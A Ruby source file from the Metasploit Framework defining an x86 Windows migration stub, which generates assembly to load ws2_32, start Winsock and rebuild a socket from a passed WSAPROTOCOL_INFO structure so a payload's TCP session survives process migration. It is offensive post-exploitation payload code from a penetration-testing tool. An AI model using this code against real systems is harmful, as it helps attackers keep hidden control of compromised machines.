# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/migrate_common'

module Msf

###
#
# Payload that supports migration over the TCP transport on x86.
#
###

module Payload::Windows::MigrateTcp

  include Msf::Payload::Windows::MigrateCommon

  WSA_VERSION = 0x190

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'TCP Transport Migration (x86)',
      'Description' => 'Migration stub to use over the TCP transport via x86',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86
    ))
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate_migrate(opts={})
    %Q^
    load_ws2_32:
      push '32'
      push 'ws2_'
      push esp                  ; pointer to 'ws2_32'
      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
      call ebp                  ; LoadLibraryA('ws2_32')
    init_networking:
      mov eax, #{WSA_VERSION}   ; EAX == version, and is also used for size
      sub esp, eax              ; allocate space for the WSAData structure
      push esp                  ; Pointer to the WSAData structure
      push eax                  ; Version required
      push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
      call ebp                  ; WSAStartup(Version, &WSAData)
    create_socket:
      push eax                  ; eax is 0 on success, use it for flags
      push eax                  ; reserved
      lea ebx, [esi+0x10]       ; get offset to the WSAPROTOCOL_INFO struct
      push ebx                  ; pass the info struct address
      push eax                  ; no protocol is specified
      inc eax
      push eax                  ; SOCK_STREAM
      inc eax
      push eax                  ; AF_INET
      push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
      call ebp                  ; WSASocketA(AF_INET, SOCK_STREAM, 0, &info, 0, 0)
      xchg edi, eax
    ^
  end

end

end

